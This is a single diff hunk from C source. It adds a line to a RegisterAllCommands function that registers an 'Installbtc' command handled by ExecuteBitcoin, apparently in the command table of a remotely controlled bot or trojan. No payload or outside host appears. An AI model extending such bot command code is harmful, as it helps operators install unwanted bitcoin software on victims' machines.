@@ -1591,5 +1591,6 @@ void RegisterAllCommands(PTaskManager Manager, DWORD Commands)
 	#endif
 
 	#ifdef BitcoinH
+		RegisterCommand(Manager, (PCHAR)CommandInstallbtc, ExecuteBitcoin );
 	#endif
 }
